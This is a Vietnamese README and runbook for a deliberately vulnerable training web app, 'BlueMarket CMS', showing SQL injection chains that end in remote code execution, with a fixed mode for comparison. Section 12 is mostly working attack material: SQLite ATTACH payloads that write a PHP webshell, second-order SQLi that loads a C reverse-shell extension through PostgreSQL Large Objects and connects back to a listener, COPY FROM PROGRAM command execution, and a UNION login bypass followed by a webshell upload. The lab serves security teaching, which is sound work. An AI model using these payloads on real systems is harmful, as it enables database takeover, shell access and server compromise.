# Demo BlueMarket CMS

File này tóm tắt các thông tin cần thiết để chạy và trình bày app `BlueMarket CMS` trong thư mục `blue-market-lab`.

## 1. Mục tiêu app

`BlueMarket CMS` là web lab mô phỏng một nền tảng nội dung/thương mại điện tử nội bộ. App có các chức năng nhìn như website thật:

- Trang chủ hiển thị sản phẩm, bài viết và người bán.
- Tìm kiếm sản phẩm.
- Danh sách seller và trang profile.
- Đăng nhập, đăng ký, cập nhật hồ sơ.
- Khu vực admin: dashboard, media library, templates, reports.
- PostgreSQL làm database chính.
- SQLite làm search analytics cache.

Điểm chính của lab là đặt các hướng SQL Injection to RCE vào luồng nghiệp vụ thật, không tách thành các trang exploit rời rạc.

## 2. Cách chạy

Vào thư mục app:

```powershell
cd D:\SQL-lead-to-RCE\blue-market-lab
```

Build và chạy Docker:

```powershell
docker compose up -d --build
```

Mở web:

```text
http://localhost:5000
```

PostgreSQL được expose ở:

```text
localhost:5432
```

Nếu cần xem log:

```powershell
docker compose logs -f
```

Nếu cần reset dữ liệu lab:

```powershell
docker compose down -v
docker compose up -d --build
```

## 3. Tài khoản mẫu

| Username | Password | Role | Ghi chú |
|---|---|---|---|
| `admin` | `admin123` | `admin` | Vào khu vực quản trị và system reports |
| `analyst` | `analyst123` | `member` | User thường |
| `lan_store` | `seller123` | `seller` | Seller có sản phẩm và activity |
| `minh_audio` | `seller123` | `seller` | Seller có sản phẩm và activity |
| `greenlab` | `seller123` | `seller` | Seller có sản phẩm và activity |

## 4. Các route chính

| Route | Chức năng |
|---|---|
| `/` | Trang chủ BlueMarket CMS |
| `/products` | Danh sách sản phẩm |
| `/search?q=...` | Tìm kiếm sản phẩm và ghi analytics cache bằng SQLite |
| `/sellers` | Danh sách người bán |
| `/profile?id=3` | Profile seller và Seller Activity Report |
| `/login` | Đăng nhập |
| `/register` | Đăng ký |
| `/admin` | Admin dashboard |
| `/admin/media` | Media Library |
| `/admin/templates` | Quản lý template |
| `/admin/reports?type=health` | Admin System Reports |

## 5. Chế độ chạy

App hỗ trợ hai mode:

```text
APP_MODE=vulnerable
APP_MODE=fixed
```

Mode mặc định trong `docker-compose.yml` là:

```text
vulnerable
```

Chạy fixed mode trên PowerShell:

```powershell
$env:APP_MODE="fixed"
docker compose up -d --build
```

Chạy vulnerable mode:

```powershell
$env:APP_MODE="vulnerable"
docker compose up -d --build
```

## 6. Cấu trúc thư mục quan trọng

```text
blue-market-lab/
├── docker-compose.yml
├── nginx/default.conf
├── postgres/
│   ├── Dockerfile
│   ├── init.sql
│   └── extensions/pg_rev_shell.c
├── app/
│   ├── Dockerfile
│   ├── public/index.php
│   ├── public/assets/styles.css
│   ├── src/Controllers/
│   ├── src/Services/
│   └── src/Views/
└── docs/
    ├── demo-flow.md
    ├── threat-model.md
    ├── vulnerable-code.md
    └── fixed-code.md
```

## 7. Mapping hai hướng PostgreSQL trong app

Nội dung trong `command_execution_postgresql.md` có hai method. Trong app, hai method này được nhúng vào hai luồng nghiệp vụ thật.

### Method 1: COPY FROM PROGRAM

Vị trí trong app:

```text
Admin → Reports → System Reports
Route: /admin/reports?type=health
Controller: app/src/Controllers/ReportController.php
Database role vulnerable mode: report_user
```

Ý nghĩa demo:

```text
SQLi trong report filter
→ stacked query
→ COPY FROM PROGRAM
→ PostgreSQL chạy command hệ điều hành
→ output được lưu vào bảng và hiển thị lại trong report
```

Trong vulnerable mode, `ReportController.php` nối trực tiếp tham số `type` vào SQL. Role `report_user` được grant `pg_execute_server_program` trong `postgres/init.sql`, nên đây là nơi trình bày Method 1.

Trong fixed mode, app dùng parameterized query và role ít quyền hơn, nên chuỗi này bị chặn.

### Method 2: PostgreSQL Extensions

Vị trí trong app:

```text
Sellers → Profile → Seller Activity Report
Route: /profile?id=<seller_id>
Controller: app/src/Controllers/ProfileController.php
Database role vulnerable mode: extension_user
Extension source: postgres/extensions/pg_rev_shell.c
```

Ý nghĩa demo:

```text
Second-order SQLi trong profile/report backend
→ Large Object hoặc cơ chế ghi file đưa .so lên server
→ CREATE FUNCTION LANGUAGE C
→ SELECT gọi function native
→ reverse shell / native code execution
```

Trong vulnerable mode, `ProfileController.php` lấy email từ bảng `users`, sau đó dùng lại email đó trong truy vấn Seller Activity bằng nối chuỗi. Đây là mô hình second-order SQLi phù hợp với Method 2 trong `command_execution_postgresql.md`.

Container PostgreSQL build sẵn source `pg_rev_shell.c` để phục vụ case study extension. Đây là hướng phân tích kỹ thuật sâu, phức tạp hơn `COPY FROM PROGRAM`.

Trong fixed mode, Seller Activity dùng parameterized query và role `app_user`, nên email chỉ là dữ liệu, không thể trở thành cú pháp SQL.

## 8. Mapping các controller chính

| File | Vai trò |
|---|---|
| `HomeController.php` | Trang chủ, sản phẩm nổi bật, seller, feed |
| `SearchController.php` | Product search và SQLite analytics cache |
| `AuthController.php` | Login, register, logout |
| `ProfileController.php` | Seller profile và Method 2 |
| `AdminController.php` | Dashboard, media, templates |
| `ReportController.php` | System reports và Method 1 |

## 9. Mapping service chính

| File | Vai trò |
|---|---|
| `PostgresService.php` | Kết nối PostgreSQL theo role `app`, `report`, `extension` |
| `SqliteCacheService.php` | Ghi search analytics vào SQLite |
| `UploadService.php` | Xử lý upload media |
| `TemplateService.php` | Lưu template admin |

## 10. Role PostgreSQL trong lab

Các role được tạo trong `postgres/init.sql`:

| Role | Mục đích |
|---|---|
| `app_user` | Role ứng dụng bình thường, dùng cho fixed mode |
| `report_user` | Role demo Method 1, có `pg_execute_server_program` |
| `extension_user` | Role demo Method 2, có quyền cao trong lab |

Ghi chú khi trình bày: `report_user` và `extension_user` là cấu hình nguy hiểm, chỉ dùng trong môi trường lab được cấp quyền.

## 11. Luồng trình bày đề xuất

1. Mở trang chủ để cho thấy đây là một website nội bộ hoàn chỉnh.
2. Vào `/products` và `/search` để giới thiệu catalog và SQLite analytics cache.
3. Vào `/sellers`, mở một `/profile?id=...` để giới thiệu Seller Activity Report.
4. Giải thích Method 2 nằm ở backend profile/report, dùng second-order SQLi và PostgreSQL Extension.
5. Đăng nhập `admin / admin123`.
6. Vào `/admin/reports?type=health`.
7. Giải thích Method 1 nằm ở report filter, dùng `COPY FROM PROGRAM`.
8. Chuyển qua fixed mode để so sánh prepared statements và least privilege.

## 12. Runbook lệnh SQLi -> RCE

Các lệnh dưới đây chạy trong môi trường lab local sau khi Docker đã chạy. Dùng `curl.exe` trên PowerShell để tránh nhầm với alias `curl` của PowerShell.

Chuẩn bị thư mục làm việc:

```powershell
cd D:\SQL-lead-to-RCE\blue-market-lab
```

Kiểm tra container:

```powershell
docker compose ps
```

Nếu vừa sửa `nginx/default.conf`, restart Nginx:

```powershell
docker compose restart nginx
```

### Hướng 1: SQLite ATTACH DATABASE -> ghi webshell -> RCE

Vị trí lỗi:

```text
Route: /search?q=...
Code: app/src/Services/SqliteCacheService.php
Primitive: SQLite ATTACH DATABASE
Kết quả: ghi file PHP vào /var/www/html/public/uploads/cache.php
```

Bước 1: gửi payload SQLi vào ô search. Payload đóng câu `INSERT`, attach một file `.php` trong webroot, tạo bảng SQLite và ghi nội dung PHP vào file đó.

```powershell
$payload = @'
x', datetime('now')); ATTACH DATABASE '/var/www/html/public/uploads/cache.php' AS shell; CREATE TABLE IF NOT EXISTS shell.payload (code TEXT); DELETE FROM shell.payload; INSERT INTO shell.payload VALUES ('<?php system($_GET[''cmd''] ?? ''id''); ?>'); --
'@

curl.exe -G --data-urlencode "q=$payload" http://localhost:5000/search
```

Bước 2: gọi file vừa ghi để chứng minh command execution.

```powershell
curl.exe "http://localhost:5000/uploads/cache.php?cmd=id"
curl.exe "http://localhost:5000/uploads/cache.php?cmd=whoami"
curl.exe "http://localhost:5000/uploads/cache.php?cmd=hostname"
```

Kết quả có thể bắt đầu bằng chuỗi rác kiểu `SQLite format 3`. Đây không phải lỗi: output của lệnh vẫn xuất hiện ở cuối response.

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Bước 3: dọn file webshell sau demo.

```powershell
Remove-Item -Force .\app\public\uploads\cache.php -ErrorAction SilentlyContinue
```

Chuỗi cần giải thích:

```text
SQLi trong product search
-> SQLite ATTACH DATABASE tới webroot
-> ghi nội dung PHP
-> truy cập file qua Nginx/PHP-FPM
-> RCE
```

### Hướng 2: PostgreSQL Large Object + Extension -> reverse shell

Vị trí lỗi:

```text
Route: /profile?id=3
Code: app/src/Controllers/ProfileController.php
Primitive: PostgreSQL Large Object + CREATE FUNCTION LANGUAGE C
File extension chuẩn bị ở máy host: postgres/artifacts/pg_rev_shell.so
File extension export: /tmp/pg_rev_shell_manual.so
Role lab: extension_user
```

Bước 1: export file `.so` ra máy host từ build stage.

```powershell
.\postgres\export-pg-rev-shell.ps1
```

Bước 2: chia file `.so` thành từng page 2048 byte.

```powershell
python .\postgres\split-so-pages.py .\postgres\artifacts\pg_rev_shell.so
Get-Content .\postgres\artifacts\pg_rev_shell_pages\manifest.txt
```

Bước 3: xác định IPv4 của máy host.

```powershell
ipconfig
```

Trong lần test ngày `2026-08-31`, listener dùng `192.168.1.7:4444`.

Bước 4: mở listener trong terminal riêng. Đây là đúng block đã test thành công:

```powershell
$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, 4444)
$listener.Start()
Write-Output 'LISTENING 4444'
$client = $listener.AcceptTcpClient()
Write-Output 'CONNECTED'
$stream = $client.GetStream()
$buffer = New-Object byte[] 8192
$cmds = @("id`n", "whoami`n", "pwd`n", "exit`n")

foreach ($cmd in $cmds) {
    $bytes = [System.Text.Encoding]::ASCII.GetBytes($cmd)
    $stream.Write($bytes, 0, $bytes.Length)
    Start-Sleep -Milliseconds 500

    while ($stream.DataAvailable) {
        $read = $stream.Read($buffer, 0, $buffer.Length)
        if ($read -le 0) { break }
        [Console]::Out.Write([System.Text.Encoding]::ASCII.GetString($buffer, 0, $read))
        Start-Sleep -Milliseconds 200
    }
}

$client.Close()
$listener.Stop()
```

Bước 5: đăng nhập seller.

```powershell
curl.exe -c seller.txt --data-urlencode "username=lan_store" --data-urlencode "password=seller123" http://localhost:5000/login
```

Bước 6: chứng minh second-order SQLi trước bằng payload nhẹ. Không dùng `--` ở cuối vì `ORDER BY created_at DESC` nằm ở dòng kế tiếp trong query app.

```powershell
$payload = @'
x'; SELECT pg_sleep(2); SELECT title, body, created_at FROM posts WHERE '1'='1
'@

curl.exe -b seller.txt -c seller.txt --data-urlencode "email=$payload" --data-urlencode "description=Second order SQLi probe" http://localhost:5000/profile/update
curl.exe -s -o NUL -w "%{time_total}" -b seller.txt "http://localhost:5000/profile?id=3"
```

Bước 7: chọn một `loid`, ví dụ `55001`, rồi tạo Large Object rỗng.

```powershell
$payload = @'
x'; DROP FUNCTION IF EXISTS rev_shell(text, integer); SELECT CASE WHEN EXISTS (SELECT 1 FROM pg_largeobject_metadata WHERE oid = 55001::oid) THEN lo_unlink(55001) ELSE 0 END; SELECT lo_create(55001); SELECT title, body, created_at FROM posts WHERE '1'='1
'@

curl.exe -b seller.txt -c seller.txt --data-urlencode "email=$payload" --data-urlencode "description=Create large object" http://localhost:5000/profile/update
curl.exe -b seller.txt "http://localhost:5000/profile?id=3"
```

Bước 8: chèn từng page vào `pg_largeobject`. Mỗi page là một cặp `POST /profile/update` rồi `GET /profile?id=3`.

```powershell
$hex = Get-Content .\postgres\artifacts\pg_rev_shell_pages\page-000.hex
$payload = "x'; INSERT INTO pg_largeobject (loid, pageno, data) VALUES (55001, 0, decode('$hex', 'hex')); SELECT title, body, created_at FROM posts WHERE '1'='1"

curl.exe -b seller.txt -c seller.txt --data-urlencode "email=$payload" --data-urlencode "description=Page 0" http://localhost:5000/profile/update
curl.exe -b seller.txt "http://localhost:5000/profile?id=3"
```

Lặp lại như trên cho `page-001.hex`, `page-002.hex` tới page cuối cùng trong `manifest.txt`.

Bước 9: export `.so`, unlink Large Object, tạo function và gọi reverse shell.

```powershell
$payload = @'
x'; SELECT lo_export(55001, '/tmp/pg_rev_shell_manual.so'); SELECT lo_unlink(55001); CREATE FUNCTION rev_shell(text, integer) RETURNS integer AS '/tmp/pg_rev_shell_manual', 'rev_shell' LANGUAGE C STRICT; SELECT rev_shell('192.168.1.7', 4444); SELECT title, body, created_at FROM posts WHERE '1'='1
'@

curl.exe -b seller.txt -c seller.txt --data-urlencode "email=$payload" --data-urlencode "description=Export extension and trigger shell" http://localhost:5000/profile/update
curl.exe -b seller.txt "http://localhost:5000/profile?id=3"
```

Request này có thể bị treo vì PostgreSQL backend đang giữ phiên shell. Quay lại terminal listener và chạy lệnh kiểm tra:

```sh
whoami
id
hostname
pwd
exit
```

Bước 10: dọn trạng thái seller, function, Large Object và file `.so` tạm.

```powershell
$payload = @'
x'; DROP FUNCTION IF EXISTS rev_shell(text, integer); SELECT CASE WHEN EXISTS (SELECT 1 FROM pg_largeobject_metadata WHERE oid = 55001::oid) THEN lo_unlink(55001) ELSE 0 END; SELECT title, body, created_at FROM posts WHERE '1'='1
'@

curl.exe -b seller.txt -c seller.txt --data-urlencode "email=$payload" --data-urlencode "description=Cleanup rev_shell" http://localhost:5000/profile/update
curl.exe -b seller.txt "http://localhost:5000/profile?id=3"
curl.exe -b seller.txt -c seller.txt --data-urlencode "email=lan.store@bluemarket.local" --data-urlencode "description=Seller reset" http://localhost:5000/profile/update
Remove-Item -Force seller.txt
```

Chuỗi cần giải thích:

```text
SQLi được lưu trong profile
-> Seller Activity Report dùng lại email bằng nối chuỗi
-> attacker bơm từng page của pg_rev_shell.so vào pg_largeobject
-> lo_export ghi Large Object ra /tmp/pg_rev_shell_manual.so
-> CREATE FUNCTION trỏ tới file .so đã export
-> SELECT rev_shell(...)
-> reverse shell với quyền postgres
-> RCE
```

Ghi chú: từ ngày `2026-08-31`, Hướng 2 không còn dùng file `.so` đặt sẵn trong runtime container. Flow mới bám theo PoC kiểu script: attacker chuẩn bị file ở máy host, chia page, rồi bơm từng page vào `pg_largeobject`. Không dùng hostname như `bm-listener` vì `pg_rev_shell.c` dùng `inet_pton()` và chỉ nhận IPv4 literal.

### Hướng 3: PostgreSQL COPY FROM PROGRAM -> command output

Vị trí lỗi:

```text
Route: /admin/reports?type=...
Code: app/src/Controllers/ReportController.php
Primitive: COPY FROM PROGRAM
Role lab: report_user có pg_execute_server_program
```

Bước 1: đăng nhập admin.

```powershell
curl.exe -c admin.txt --data-urlencode "username=admin" --data-urlencode "password=admin123" http://localhost:5000/login
```

Bước 2: gửi payload SQLi vào report filter. Payload tạo bảng `cmd_output`, chạy lệnh `id`, rồi output được đọc lại trong trang Reports.

```powershell
$payload = @'
health'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line TEXT); COPY cmd_output FROM PROGRAM 'id'; SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
'@

curl.exe -b admin.txt -G --data-urlencode "type=$payload" http://localhost:5000/admin/reports
```

Bước 3: xem ngay trong web phần `Worker Output`. Lần test ngày `2026-08-31` trả về:

```text
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
```

Bước 4: thử các lệnh an toàn khác.

```powershell
$payload = @'
health'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line TEXT); COPY cmd_output FROM PROGRAM 'whoami'; SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
'@
curl.exe -b admin.txt -G --data-urlencode "type=$payload" http://localhost:5000/admin/reports

$payload = @'
health'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line TEXT); COPY cmd_output FROM PROGRAM 'hostname'; SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
'@
curl.exe -b admin.txt -G --data-urlencode "type=$payload" http://localhost:5000/admin/reports
```

Bước 5: dọn bảng output.

```powershell
docker compose exec postgres psql -U postgres -d bluemarket -c "DROP TABLE IF EXISTS cmd_output;"
Remove-Item -Force admin.txt
```

Chuỗi cần giải thích:

```text
SQLi trong admin report filter
-> stacked query
-> COPY cmd_output FROM PROGRAM '<command>'
-> PostgreSQL chạy command OS
-> SELECT/TABLE đọc output
-> RCE
```

### Hướng 4: SQLi -> admin takeover -> upload PHP -> RCE

Vị trí lỗi:

```text
Route takeover: /login
Route RCE: /admin/media -> /uploads/shell.php
Code: app/src/Controllers/AuthController.php + app/src/Services/UploadService.php
Primitive: app-layer upload/template execution
```

Bước 1: dùng SQLi ở login để tạo một admin row giả bằng `UNION SELECT`. Password gửi kèm là `ownedpass`, trùng với cột `password_hash` trong row giả.

```powershell
$payload = @'
' UNION SELECT 999,'owned','owned@bluemarket.local','ownedpass','admin','Injected admin row',CURRENT_TIMESTAMP--
'@

curl.exe -c takeover.txt --data-urlencode "username=$payload" --data-urlencode "password=ownedpass" http://localhost:5000/login
```

Bước 2: tạo file PHP để upload qua Media Library.

```powershell
Set-Content -Path .\shell.php -Encoding ASCII -Value '<?php system($_GET["cmd"] ?? "id"); ?>'
```

Bước 3: upload file bằng session admin vừa takeover.

```powershell
curl.exe -b takeover.txt -F "media=@shell.php;type=image/png" http://localhost:5000/admin/media
```

Bước 4: gọi webshell để chứng minh RCE.

```powershell
curl.exe "http://localhost:5000/uploads/shell.php?cmd=id"
curl.exe "http://localhost:5000/uploads/shell.php?cmd=whoami"
curl.exe "http://localhost:5000/uploads/shell.php?cmd=hostname"
```

Bước 5: dọn file local, cookie và file upload.

```powershell
Remove-Item -Force .\shell.php
Remove-Item -Force takeover.txt
docker compose exec web rm -f /var/www/html/public/uploads/shell.php
```

Chuỗi cần giải thích:

```text
SQLi trong login
-> bypass/takeover admin bằng UNION SELECT
-> dùng chức năng Media Library
-> upload PHP vào uploads
-> Nginx/PHP-FPM thực thi file
-> RCE
```

## 13. Kiểm tra fixed mode

Chuyển sang fixed mode:

```powershell
docker compose down
$env:APP_MODE="fixed"
docker compose up -d --build
```

Kiểm tra lại các payload trên:

```text
Hướng 1: SQLite dùng prepared statement, payload chỉ được ghi như keyword.
Hướng 2: Profile activity dùng parameterized query và app_user.
Hướng 3: Report filter dùng parameterized query và app_user không có pg_execute_server_program.
Hướng 4: Login dùng parameterized query, upload chỉ nhận media extension hợp lệ.
```

Quay lại vulnerable mode:

```powershell
docker compose down
$env:APP_MODE="vulnerable"
docker compose up -d --build
```

## 14. File tài liệu liên quan

- `README.md`: mô tả ý tưởng tổng thể của BlueMarket CMS.
- `command_execution_postgresql.md`: mô tả hai method PostgreSQL command execution.
- `blue-market-lab/docs/demo-flow.md`: mapping chi tiết hai method vào app.
- `blue-market-lab/docs/vulnerable-code.md`: các đoạn code cố ý có lỗi.
- `blue-market-lab/docs/fixed-code.md`: cách fixed mode chặn chuỗi SQLi to RCE.
- `blue-market-lab/docs/threat-model.md`: threat model ngắn cho lab.

## 15. Lưu ý an toàn

Lab này chỉ dùng cho môi trường Docker/local hoặc môi trường được cấp quyền. Không deploy app vulnerable mode lên server thật. Không dùng database superuser hoặc role có `pg_execute_server_program` cho web app production.


